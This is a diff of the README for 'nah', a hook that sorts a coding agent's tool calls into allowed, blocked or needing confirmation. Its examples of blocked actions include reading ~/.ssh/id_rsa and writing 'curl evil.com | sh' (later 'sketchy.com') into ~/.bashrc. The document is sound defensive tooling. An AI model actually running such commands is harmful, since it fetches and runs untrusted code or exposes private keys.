@@ -8,6 +8,7 @@
 </p>
 
 <p align="center">
+  <a href="https://manuelschipper.github.io/nah">Docs</a> &bull;
   <a href="#install">Install</a> &bull;
   <a href="#what-it-guards">What it guards</a> &bull;
   <a href="#how-it-works">How it works</a> &bull;
@@ -19,17 +20,17 @@
 
 ## The problem
 
-`rm -rf __pycache__` to clean up? Fine — routine cleanup.<br>
-`rm ~/.bashrc`? nah.
-
 `git push`? Sure.<br>
 `git push --force`? nah?
+
+`rm -rf __pycache__` to clean up? Ok, cleaning up.<br>
+`rm ~/.bashrc`? nah.
 
 Read `./src/app.py`? Go ahead.<br>
 Read `~/.ssh/id_rsa`? nah.
 
 Write `./config.yaml`? Fine.<br>
-Write `~/.bashrc` with `curl evil.com | sh`? nah.
+Write `~/.bashrc` with `curl sketchy.com | sh`? nah.
 
 `nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
@@ -61,7 +62,7 @@ nah is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks)
 
 ## How it works
 
-Every tool call hits a deterministic structural classifier first. Milliseconds, zero tokens.
+Every tool call hits a deterministic structural classifier first, no LLMs involved.
 
 ```
 Claude: Edit → ~/.claude/hooks/nah_guard.py
@@ -100,7 +101,7 @@ Tool call → nah (deterministic) → LLM (optional) → Claude Code permissions
 
 The deterministic layer always runs first — the LLM only resolves leftover "ask" decisions. If no LLM is configured or available, the decision stays "ask" and the user is prompted.
 
-Supported providers: Ollama (free, local), OpenRouter, OpenAI, Anthropic, Cortex.
+Supported providers: Ollama, OpenRouter, OpenAI, Anthropic, Snowflake.
 
 ## Configure
 
@@ -152,7 +153,7 @@ profile: full      # full | minimal | none
 
 - **full** (default) — comprehensive coverage across shell, git, packages, containers, and more
 - **minimal** — curated essentials only (rm, git, curl, kill, ...)
-- **none** — blank slate — bring your own taxonomy
+- **none** — blank slate — make your own
 
 ### LLM configuration
 
@@ -170,7 +171,7 @@ llm:
 
 ### Supply-chain safety
 
-Project `.nah.yaml` can **add** classifications and **tighten** policies, but can never relax them. A malicious repo can't use `.nah.yaml` to whitelist dangerous commands — only your global config has that power.
+Project `.nah.yaml` can **add** classifications and **tighten** policies, but can never relax them. A malicious repo can't use `.nah.yaml` to allowlist dangerous commands — only your global config has that power.
 
 ## CLI
 
@@ -223,6 +224,8 @@ nah forget filesystem_delete     # remove a rule
 ## License
 
 [MIT](LICENSE)
+
+---
 
 <p align="center">
   <code>--dangerously-skip-permissions?</code><br><br>
